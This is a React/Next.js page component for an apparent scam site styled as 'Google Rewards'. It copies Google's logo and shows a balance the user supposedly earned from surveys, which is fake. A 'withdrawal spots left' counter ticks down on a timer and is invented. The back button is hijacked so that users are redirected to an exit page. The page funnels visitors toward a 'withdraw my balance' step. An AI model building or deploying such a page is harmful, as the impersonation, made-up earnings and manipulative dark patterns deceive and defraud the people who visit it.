"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { AnimatedBalance } from "@/components/flow/animated-balance"
import { Confetti } from "@/components/flow/confetti"
import { TrustBadges } from "@/components/flow/trust-badges"

export default function CongratsPage() {
  const router = useRouter()
  const [balance, setBalance] = useState(0)
  const [isLoading, setIsLoading] = useState(false)
  const [spotsLeft, setSpotsLeft] = useState(14)
  const [showContent, setShowContent] = useState(false)

  useEffect(() => {
    const stored = localStorage.getItem("captcha_balance")
    if (stored) setBalance(parseInt(stored, 10))
  }, [])

  useEffect(() => {
    window.history.pushState(null, "", window.location.href)
    const handlePopState = () => {
      window.history.pushState(null, "", window.location.href)
      localStorage.setItem("exit_return_page", "/congrats")
      router.push("/exit")
    }
    window.addEventListener("popstate", handlePopState)
    return () => window.removeEventListener("popstate", handlePopState)
  }, [router])

  useEffect(() => {
    const timer = setTimeout(() => setShowContent(true), 100)
    return () => clearTimeout(timer)
  }, [])

  useEffect(() => {
    const interval = setInterval(() => {
      setSpotsLeft(prev => Math.max(prev - 1, 2))
    }, 12000)
    return () => clearInterval(interval)
  }, [])

  const handleWithdraw = () => {
    setIsLoading(true)
    setTimeout(() => router.push("/final"), 800)
  }

  return (
    <div className="min-h-screen min-h-[100dvh] bg-[#f1f3f4] flex flex-col">
      <main className="flex flex-col w-full max-w-md mx-auto px-3 py-3 flex-1">
        <div className="animate-page-enter">
          <section className="flex flex-col bg-white -mx-4 -mt-4 px-4 pt-4 pb-4">
            <Confetti trigger={showContent} />
            {/* Main Content */}
            <div className={`flex flex-col transition-all duration-700 ${showContent ? "opacity-100 translate-y-0" : "opacity-0 translate-y-4"}`}>

              {/* Main Card */}
              <div className="bg-[#f8f9fa] rounded-2xl border border-[#dadce0] text-center mb-4 shadow-[0_1px_3px_rgba(0,0,0,0.08),0_4px_12px_rgba(0,0,0,0.04)]">
                {/* Header inside card */}
                <div className="flex items-center justify-between px-3 py-2.5 border-b border-[#dadce0]">
                  <div className="flex items-center gap-2">
                    <svg viewBox="0 0 24 24" className="h-7 w-7 flex-shrink-0">
                      <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                      <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                      <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                      <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                    </svg>
                    <div className="flex flex-col leading-tight">
                      <span className="text-sm font-semibold text-[#202124]">Google</span>
                      <span className="text-[10px] text-[#5f6368] -mt-0.5">Rewards</span>
                    </div>
                  </div>
                  <div className="border-2 border-dashed border-[#34a853] rounded-xl px-2 py-1 flex items-center gap-1">
                    <span className="text-[8px] text-[#5f6368] font-medium uppercase leading-tight">Your Current<br/>Balance:</span>
                    <span className="text-sm font-bold text-[#34a853]">US$ </span>
                    <AnimatedBalance value={balance} className="text-sm font-bold text-[#34a853] tabular-nums" />
                  </div>
                </div>

                <div className="p-4">
                <div className="text-2xl font-bold text-gray-900 mb-2 whitespace-nowrap">{"🎁 Congratulations! 🎁"}</div>

                <p className="text-sm text-gray-600 mb-3">
                  {"Your balance is available for immediate withdrawal! 🎉"}
                </p>

                {/* Earnings box */}
                <div className="bg-[#e8f5e9] border border-[#c8e6c9] rounded-xl p-3 mb-3">
                  <p className="text-sm text-gray-800 font-medium">
                    These are your earnings for the 3 surveys you just completed.
                  </p>
                </div>

                <p className="text-sm text-gray-600">
                  {"Click the button below and see the immediate withdrawal guide! 👇"}
                </p>
                </div>
              </div>

              {/* Spots left urgency */}
              <div className="flex items-center justify-center gap-2 bg-[#fff3e0] border border-[#ffe0b2] rounded-xl px-3 py-2 mb-3">
                <span className="text-sm">{"⚠️"}</span>
                <span className="text-xs text-[#e65100] font-bold">
                  Only {spotsLeft} withdrawal spots left today!
                </span>
              </div>

              {/* Withdraw Button */}
              <button
                onClick={handleWithdraw}
                disabled={isLoading}
                className={`w-full text-white font-bold py-3 px-4 rounded-xl text-base
                  btn-3d-green cursor-pointer
                  transition-all duration-150
                  disabled:opacity-70 disabled:cursor-not-allowed
                  ${!isLoading ? "animate-btn-breathe" : ""}`}
                style={isLoading ? { boxShadow: 'none', background: '#4285f4' } : undefined}
              >
                {isLoading ? (
                  <div className="flex items-center justify-center gap-2">
                    <div className="h-4 w-4 border-[2px] border-white/30 border-t-white rounded-full animate-spin" />
                    <span>Loading...</span>
                  </div>
                ) : (
                  <div className="flex items-center justify-center gap-2">
                    <span className="text-base">{"▶"}</span>
                    <span>Yes, withdraw my balance now!</span>
                  </div>
                )}
              </button>

              {/* Trust Badges */}
              <div className="mt-3">
                <TrustBadges />
              </div>
            </div>

            {/* Footer */}
            <footer className="mt-6 text-center">
              <div className="flex items-center justify-center gap-1.5 mb-1">
                <svg viewBox="0 0 24 24" className="h-4 w-4">
                  <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                  <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                  <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                  <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
                <span className="text-sm text-gray-400">{"© 2026 Google Rewards"}</span>
              </div>
              <div className="flex items-center justify-center gap-2">
                <a href="#" className="text-xs text-gray-400 underline">Privacy Policy</a>
                <span className="text-xs text-gray-400">|</span>
                <a href="#" className="text-xs text-gray-400 underline">Terms of use</a>
              </div>
            </footer>
          </section>
        </div>
      </main>

      {/* Bottom nav bar - Safari compatible */}
      <nav className="bg-white border-t border-[#dadce0] fixed bottom-0 left-0 right-0 z-40 px-3 pt-2 pb-[calc(0.75rem+env(safe-area-inset-bottom,0px))] shadow-[0_-2px_8px_rgba(0,0,0,0.04)]">
        <div className="relative mx-4 mb-2">
          <div className="absolute top-[11px] left-0 right-0 h-[3px] bg-[#e8eaed] rounded-full" />
          <div className="absolute top-[11px] left-0 h-[3px] bg-gradient-to-r from-[#4285f4] to-[#4285f4] rounded-full transition-all duration-1000 ease-[cubic-bezier(0.4,0,0.2,1)]" style={{ width: "80%" }} />

          <div className="relative flex items-center justify-between">
            <div className="flex flex-col items-center gap-0.5">
              <div className="w-[22px] h-[22px] rounded-full flex items-center justify-center transition-all duration-500 ease-out bg-[#34a853] shadow-[0_0_0_2px_rgba(52,168,83,0.15)]">
                <svg className="w-3 h-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <span className="text-[9px] font-semibold transition-colors duration-300 text-[#34a853]">Home</span>
            </div>

            <div className="flex flex-col items-center gap-0.5">
              <div className="w-[22px] h-[22px] rounded-full flex items-center justify-center transition-all duration-500 ease-out bg-[#34a853] shadow-[0_0_0_2px_rgba(52,168,83,0.15)]">
                <svg className="w-3 h-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <span className="text-[9px] font-semibold transition-colors duration-300 text-[#34a853]">Tasks</span>
            </div>

            <div className="flex flex-col items-center gap-0.5">
              <div className="w-[22px] h-[22px] rounded-full flex items-center justify-center transition-all duration-500 ease-out bg-[#4285f4] shadow-[0_0_0_2px_rgba(66,133,244,0.2)]">
                <svg className="w-3 h-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
              <span className="text-[9px] font-semibold transition-colors duration-300 text-[#4285f4]">Rewards</span>
            </div>
          </div>
        </div>
      </nav>

      {/* Spacer for fixed bottom nav */}
      <div className="h-20" />
    </div>
  )
}
